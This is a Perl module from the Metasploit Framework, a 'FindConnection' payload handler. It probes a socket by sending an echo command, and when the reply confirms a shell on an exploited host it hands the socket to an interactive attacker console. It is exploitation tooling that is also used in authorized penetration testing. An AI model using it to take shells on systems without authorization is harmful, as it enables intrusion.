#!/usr/bin/perl

package Msf::PayloadComponent::FindConnection;
use strict;
use base 'Msf::PayloadComponent::ConnectionHandler';
use IO::Socket::INET;
use IO::Select;

sub ChildHandler {
  my $self = shift;
  my $sock = shift;
  my $blocking = $sock->blocking;
  $sock->blocking(1);
  $sock->autoflush(1);

  sleep(1);

  my $selector = IO::Select->new($sock);

  my @ready = $selector->can_write(0.5);

  goto DONE if(!@ready || !$ready[0]->connected);

  $ready[0]->send("echo ABCDE\r\n");

  @ready = $selector->can_read(0.5);

  goto DONE if(!@ready || !$ready[0]->connected);

  my $data;
  $ready[0]->recv($data, 4096);
  
  goto DONE if(!length($data));
  if($data =~ /ABCDE/) {
    $self->SocketIn($ready[0]);
    $self->SocketOut($ready[0]);
    $self->PrintLine('[*] Findsock found shell...');
    $self->HandleConsole;
    exit(0);
  }

DONE:
  $sock->blocking($blocking);
  return;
}

sub SigHandler {
  my $self = shift;
}
1;
